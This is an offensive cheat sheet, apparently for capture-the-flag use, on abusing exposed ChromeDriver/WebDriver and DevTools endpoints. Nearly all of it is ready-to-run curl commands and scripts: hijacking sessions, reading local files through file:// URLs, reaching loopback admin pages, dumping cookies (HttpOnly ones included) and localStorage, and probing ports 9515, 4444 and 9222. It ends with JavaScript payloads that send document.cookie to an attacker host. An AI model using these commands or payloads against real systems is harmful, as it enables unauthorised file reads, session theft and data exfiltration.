# Quick reference deep — every command, annotated

## Session lifecycle

```bash
# create — alwaysMatch carries the browser + chrome options
curl -s -X POST http://HOST:9515/session -H 'Content-Type: application/json' -d '{
  "capabilities":{"alwaysMatch":{
    "browserName":"chrome",
    "goog:chromeOptions":{"args":["--headless=new","--no-sandbox","--disable-dev-shm-usage"]}
  }}}'
# -> {"value":{"sessionId":"abc","capabilities":{...}}}

# destroy — ALWAYS, holds a browser process
curl -s -X DELETE http://HOST:9515/session/abc
```

## Navigation

```bash
curl -X POST .../session/$S/url -d '{"url":"http://target/"}'   # goto
curl -X POST .../session/$S/url -d '{"url":"file:///flag"}'     # file read
curl -X POST .../session/$S/url -d '{"url":"http://localhost/admin"}' # loopback
curl .../session/$S/url                                          # current URL
curl -X POST .../session/$S/back -d '{}'                         # back
curl -X POST .../session/$S/refresh -d '{}'                      # refresh
```

## Reading

```bash
curl .../session/$S/source        # rendered DOM / file text
curl .../session/$S/title         # page title
curl .../session/$S/screenshot    # base64 PNG -> decode to file
curl .../session/$S/cookies       # the jar (HttpOnly included)
```

## JavaScript

```bash
# sync — returns the script's return value
curl -X POST .../session/$S/execute/sync -d '{"script":"return document.cookie","args":[]}'
curl -X POST .../session/$S/execute/sync -d '{"script":"return JSON.stringify(localStorage)","args":[]}'
curl -X POST .../session/$S/execute/sync -d '{"script":"return fetch(\"/flag\").then(r=>r.text())","args":[]}'

# async — last arg is the callback; invoke it to return
curl -X POST .../session/$S/execute/async -d '{"script":"var d=arguments[0];fetch(\"/f\").then(r=>r.text()).then(d)","args":[]}'

# file read via JS when file:// nav is blocked
curl -X POST .../session/$S/execute/sync -d '{"script":"return fetch(\"file:///flag\").then(r=>r.text())","args":[]}'
```

## Cookies

```bash
curl .../session/$S/cookies                                             # all for origin
curl -X POST .../session/$S/cookies -d '{"cookie":{"name":"s","value":"x","path":"/"}}'
curl -X DELETE .../session/$S/cookies/s                                 # one
curl -X DELETE .../session/$S/cookies                                   # all
```

## Elements

```bash
curl -X POST .../session/$S/element -d '{"using":"css selector","value":"#x"}'
curl -X POST .../session/$S/element/E1/click -d '{}'
curl -X POST .../session/$S/element/E1/value -d '{"text":"hi"}'
curl .../session/$S/element/E1/text
```

## Config

```bash
curl -X POST .../session/$S/timeouts -d '{"script":15000,"pageLoad":15000,"implicit":3000}'
curl -X POST .../session/$S/window/rect -d '{"width":1280,"height":800}'
curl .../status                                                         # driver/browser version
curl .../sessions                                                       # active sessions (non-std)
```

## The detection probes

```bash
curl -s -m5 -X POST http://T:9515/session -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}'
curl -s http://T:4444/status          # Grid inventory
curl -s http://T:9222/json            # CDP targets
```

## Playwright reproduction (copy-paste)

```python
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    b=p.chromium.launch(headless=True,args=['--no-sandbox','--disable-dev-shm-usage'])
    pg=b.new_page()
    pg.on("console",lambda m:print("C:",m.text))
    pg.on("pageerror",lambda e:print("E:",e))
    pg.on("request",lambda r:print("R:",r.method,r.url))
    pg.on("requestfailed",lambda r:print("F:",r.url))
    pg.context.add_cookies([{'name':'flag','value':'TEST','domain':'localhost','path':'/'}])
    pg.goto(URL); pg.wait_for_timeout(5000); b.close()
```

## The exfil payloads

```javascript
fetch('https://T/?c='+encodeURIComponent(document.cookie));
new Image().src='https://T/i.png?c='+document.cookie;
navigator.sendBeacon('https://T/?c='+document.cookie);
fetch('/api/p',{method:'POST',body:'b='+document.cookie});   // write-back
top.location='https://T/?c='+document.cookie;
```
